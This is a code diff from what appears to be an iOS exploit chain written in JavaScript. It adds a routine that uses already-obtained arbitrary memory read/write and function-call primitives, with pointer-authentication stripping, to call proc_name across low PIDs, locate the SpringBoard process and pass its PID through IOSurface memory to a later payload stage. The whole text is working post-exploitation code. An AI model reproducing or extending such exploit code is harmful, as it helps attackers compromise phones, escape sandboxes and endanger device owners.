@@ -7082,11 +7082,45 @@
     } else {
       LOG("[MPD] proc_listpids gpuDlsym returned NULL");
     }
+    // Scan for SpringBoard PID using proc_name (only check low PIDs, early boot processes)
+    let springboard_pid = 0n;
+    let proc_name_raw = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "proc_name");
+    LOG(`[MPD] gpuDlsym(proc_name) = ${proc_name_raw.hex()}`);
+    if (proc_name_raw != 0n && plist_count > 0n) {
+      let name_buf = mpd_malloc(32n);
+      let num_pids = plist_count / 4n;
+      let scanned = 0;
+      // Scan lowest PIDs first (end of sorted list) - SpringBoard starts early
+      for (let si = num_pids - 1n; si >= 0n && springboard_pid == 0n && scanned < 60; si--) {
+        let paddr = plist_buf + si * 4n;
+        let aligned = paddr & ~7n;
+        let v = mpd_read64(aligned);
+        let shift = (paddr - aligned) * 8n;
+        let pid = (v >> shift) & 0xFFFFFFFFn;
+        if (pid == 0n || pid > 500n) continue;
+        scanned++;
+        LOG(`[MPD] checking PID=${pid}...`);
+        // Clear name buffer
+        mpd_write64(name_buf, 0n); mpd_write64(name_buf + 8n, 0n);
+        mpd_write64(name_buf + 16n, 0n); mpd_write64(name_buf + 24n, 0n);
+        // proc_name(pid, buf, 32) returns 0 on success
+        let pn_ret = mpd_fcall(proc_name_raw.noPAC(), pid, name_buf, 32n, 0n, 0n, 0n, 0n, 0n);
+        // Read back name (two qwords)
+        let n0 = mpd_read64(name_buf);
+        let n1 = mpd_read64(name_buf + 8n);
+        LOG(`[MPD]   PID=${pid} n0=${n0.hex()} n1=${n1.hex()} ret=${pn_ret}`);
+        // "SpringBo" = 0x6F42676E69727053 in little-endian (8 bytes)
+        if (n0 == 0x6F42676E69727053n) {
+          springboard_pid = pid;
+          LOG(`[MPD] FOUND SpringBoard! pid=${pid} ret=${pn_ret}`);
+        }
+      }
+      if (springboard_pid == 0n) LOG(`[MPD] SpringBoard not found (scanned ${scanned} PIDs)`);
+    }
     uwrite64(surface_address + 0xF838n, plist_buf);
     uwrite64(surface_address + 0xF840n, plist_count);
-    if (plist_count != 0n) {
-      LOG(`[MPD] Stored plist_buf=${plist_buf.hex()} count=${plist_count} in IOSurface`);
-    }
+    uwrite64(surface_address + 0xF848n, springboard_pid);
+    if (springboard_pid != 0n) LOG(`[MPD] SpringBoard PID=${springboard_pid} stored at IOSurface +0xF848`);
 
     // Use nowait evaluate + IOSurface log polling (bypasses mpd_fcall issues)
     LOG("[MPD] Evaluating pe_main (nowait)...");
